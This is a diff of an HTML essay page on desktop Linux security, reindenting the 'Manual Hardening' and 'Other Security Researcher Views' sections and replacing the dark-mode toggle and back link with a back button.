-  <h2 id="hardening"><a href="#hardening">7. Manual Hardening</a></h2>
+    <h2 id="hardening"><a href="#hardening">7. Manual Hardening</a></h2>
 
-  <p>
-    It's a common assumption that the issues within the security model of desktop Linux is only "by default" and can be tweaked how
-    the user wishes; however, standard system hardening techniques are not enough to fix any of these massive architectural security
-    issues. Restricting a few minor things is not going to fix this. Likewise, a few common security features distributions deploy
-    by default is also not going to fix this. Just because your distribution enables a MAC framework without creating a strict policy
-    and still running most processes unconfined, does not mean you can escape from these issues. <br>
-    <br>
-    The hardening required for a reasonably secure Linux distribution is far greater than people assume. You would need to completely
-    redesign how the operating system functions and implement full system MAC policies, full verified boot (not just for the kernel but
-    the entire base system), a strong sandboxing architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty
-    more. Even then, your efforts will still be limited by the incompatibility with the rest of the desktop Linux ecosystem and the general
-    disregard that most have for security. 
-  </p>
+    <p>
+      It's a common assumption that the issues within the security model of desktop Linux is only "by default" and can be tweaked how
+      the user wishes; however, standard system hardening techniques are not enough to fix any of these massive architectural security
+      issues. Restricting a few minor things is not going to fix this. Likewise, a few common security features distributions deploy
+      by default is also not going to fix this. Just because your distribution enables a MAC framework without creating a strict policy
+      and still running most processes unconfined, does not mean you can escape from these issues. <br>
+      <br>
+      The hardening required for a reasonably secure Linux distribution is far greater than people assume. You would need to completely
+      redesign how the operating system functions and implement full system MAC policies, full verified boot (not just for the kernel but
+      the entire base system), a strong sandboxing architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty
+      more. Even then, your efforts will still be limited by the incompatibility with the rest of the desktop Linux ecosystem and the general
+      disregard that most have for security. 
+    </p>
 
-  <h2 id="security-researcher-views"><a href="#security-researcher-views">8. Other Security Researcher Views on Linux</a></h2>
+    <h2 id="security-researcher-views"><a href="#security-researcher-views">8. Other Security Researcher Views on Linux</a></h2>
 
-  <p>
-    <a href="https://twitter.com/grsecurity/status/1249850031357788162">Many</a> <a href="https://grsecurity.net/10_years_of_linux_security.pdf">security</a> <a
-    href="https://www.youtube.com/watch?v=v7_mwg5f2cE">experts</a> <a href="
-    https://github.com/ossf/wg-securing-critical-projects/blob/main/presentations/The_state_of_the_Linux_kernel_security.pdf">also</a>
-    <a href="https://www.reddit.com/r/GrapheneOS/comments/bddq5u/os_security_ios_vs_grapheneos_vs_stock_android/ekxifpa/">share</a> <a
-    href="https://www.openwall.com/lists/oss-security/2020/10/05/5">these</a> <a href="
-    https://grsecurity.net/%7Espender/interview_notes.txt">views</a> <a
-    href="https://twitter.com/rootkovska/status/1136220742662664193">about</a> <a
-    href="https://twitter.com/spendergrsec/status/1308734202330963970">Linux</a>.
-  </p>
+    <p>
+      <a href="https://twitter.com/grsecurity/status/1249850031357788162">Many</a> <a href="https://grsecurity.net/10_years_of_linux_security.pdf">security</a> <a
+      href="https://www.youtube.com/watch?v=v7_mwg5f2cE">experts</a> <a href="
+      https://github.com/ossf/wg-securing-critical-projects/blob/main/presentations/The_state_of_the_Linux_kernel_security.pdf">also</a>
+      <a href="https://www.reddit.com/r/GrapheneOS/comments/bddq5u/os_security_ios_vs_grapheneos_vs_stock_android/ekxifpa/">share</a> <a
+      href="https://www.openwall.com/lists/oss-security/2020/10/05/5">these</a> <a href="
+      https://grsecurity.net/%7Espender/interview_notes.txt">views</a> <a
+      href="https://twitter.com/rootkovska/status/1136220742662664193">about</a> <a
+      href="https://twitter.com/spendergrsec/status/1308734202330963970">Linux</a>.
+    </p>
 
-  <p class="p-final">
-    <a href="index.html" class="back">Go back</a>
-  </p>
-
-  <button class="dark-mode-toggle">🌓</button>
-  <script type="text/javascript" src="toggle.js"></script>
-</body>
+    <button class="back"><a href="index.html">Go back</a></button>
+  </body>
 </html>
